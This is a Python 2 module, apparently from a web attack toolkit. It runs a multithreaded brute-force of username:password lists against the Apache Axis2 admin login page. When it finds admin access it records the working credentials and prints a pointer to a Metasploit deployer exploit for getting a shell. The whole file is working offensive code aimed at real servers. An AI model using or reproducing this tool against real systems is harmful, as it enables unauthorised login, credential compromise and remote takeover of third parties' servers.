#encoding: utf-8
#some code hacked byzzt
import sys
import threading
import Queue
import re
from config import *
from base64 import b64encode
from common import *

class FuzzEnginer5(object):
	"""docstring for FuzzEnginer"""
	def __init__(self, url,passwords):
		super(FuzzEnginer5, self).__init__()
		tmp_uri = sys.argv[3] if len(sys.argv) == 4 else axis2_uri 
		self.url = url + tmp_uri 
		self.passwords = passwords

	class FuzzWorker(threading.Thread):
		def __init__(self, queue, url):
			threading.Thread.__init__(self)
			self.queue = queue
			self.url = url

		def run(self):
			while True:
				if self.queue.empty():
					break

				if not checksite_isalive(self.url):
					break

				try: # 用hack方法，no_timeout读取Queue队列，直接异常退出线程避免阻塞
					password = self.queue.get_nowait()
					tmp_pass = password.split(":")

					payload = {'userName':tmp_pass[0].strip(),'password':tmp_pass[1].strip(),'submit':'+Login+'}
					
					results = http_request_post(self.url,payload)
					# print "[%s] %s => %s" % (results.status_code, url, results.url) # 客户端调试信息

					if results.status_code in success_status:
						if '<a href="axis2-admin/upload">Upload Service</a>' in results.text:
							resources[results.status_code] = {'request':results.url,'password':password.strip()}
							print "[%s] %s => %s" % (results.status_code, results.url, password) # 客户端调试信息	
							print "[***] Use metasploit exploit/multi/http/axis2_deployer to Getshell"
							
				except Exception, e: # 队列阻塞
					# print e
					break

	def start(self):

		global resources
		resources = {}
		count = 0

		queue = Queue.Queue()
		for password in self.passwords: # 生成任务队列
			queue.put(password)
			count += 1
		for status_code in exclude_status: # 初始化全局状态码数据
			resources[status_code] = {}
		threads = [] # 初始化线程组
		for i in xrange(threads_count):
			threads.append(self.FuzzWorker(queue,self.url))
		for t in threads: # 启动线程
			t.start()
		for t in threads: # 等待线程执行结束后，回到主线程中
			t.join()
		return resources,count

